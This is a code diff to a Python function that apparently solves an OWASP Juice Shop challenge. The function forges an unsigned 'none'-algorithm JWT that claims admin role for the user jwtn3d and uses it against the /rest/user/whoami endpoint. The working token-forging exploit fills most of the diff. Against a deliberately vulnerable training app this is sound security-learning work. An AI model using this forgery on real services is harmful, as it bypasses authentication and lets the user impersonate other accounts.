@@ -2,33 +2,45 @@
 def access_with_none_algo(server, session):
     """
     Forge a JWT with 'none' algorithm and access a protected endpoint.
+    User: jwtn3d@juice-sh.op
     """
     print('Forging JWT with None algorithm...'),
     try:
-        # 1. Get a valid user email (we are admin usually)
-        # We need to impersonate someone or just be admin?
-        # Challenge: "Forge an unsigned JWT token"
-        
-        # Header: {"alg":"none","typ":"JWT"} -> eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=
-        header = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0" # (without padding ideally)
-        
-        # Payload: {"email":"jwtn3d@juice-sh.op","iat":..., "data":...}
-        # Challenge requires jwtn3d@juice-sh.op
-        payload_data = '{"email":"jwtn3d@juice-sh.op"}'
         import base64
-        payload = base64.urlsafe_b64encode(payload_data.encode()).decode().rstrip('=')
+        import json
         
-        # Signature: must be empty
+        # Header: {"alg":"none","typ":"JWT"}
+        header_data = {"alg": "none", "typ": "JWT"}
+        
+        # Payload: Nested 'data' object is required by backend (verified via debug script)
+        # Without this, endpoints like 'whoami' crash with "Cannot read properties of undefined (reading 'id')"
+        payload_data = {
+            "data": {
+                "id": 666, # Dummy ID
+                "email": "jwtn3d@juice-sh.op",
+                "username": "jwtn3d",
+                "role": "admin"
+            }
+        }
+        
+        def b64url(d):
+            return base64.urlsafe_b64encode(json.dumps(d, separators=(',', ':')).encode()).decode().rstrip('=')
+            
+        header = b64url(header_data)
+        payload = b64url(payload_data)
+        
+        # Signature is empty
         token = f"{header}.{payload}."
         
-        # Use it
         headers = {'Authorization': f'Bearer {token}'}
-        # Call an endpoint that requires auth? e.g. /rest/basket/1
-        res = session.get(f'{server}/rest/basket/666', headers=headers)
-        if res.status_code != 401:
-             print('Success (maybe).')
+        
+        # We use /rest/user/whoami. If successful (200), we have effectively impersonated the user.
+        res = session.get(f'{server}/rest/user/whoami', headers=headers)
+        
+        if res.ok:
+             print('Success.')
         else:
-             print('Failed.')
+             print(f'Failed (Status {res.status_code}).')
     except Exception as e:
         print(f"Warning: JWT None Algo failed: {e}")
 
